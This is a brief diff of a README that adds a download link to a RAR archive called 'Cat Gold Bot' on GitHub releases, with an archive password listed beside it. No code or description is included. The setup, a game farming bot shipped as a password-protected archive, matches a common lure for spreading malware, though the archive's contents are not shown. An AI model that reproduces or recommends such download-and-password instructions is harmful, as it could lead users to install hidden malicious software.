@@ -1,7 +1,7 @@
 > [!TIP]
 > 
 
-* ## [Download]()
+* ## [Download](https://github.com/mxshca/cat-gold-farmbot/releases/download/goldcat/Cat.Gold.Bot.rar)
 * ## PASS: LOAD12121
 
 > [!Caution]
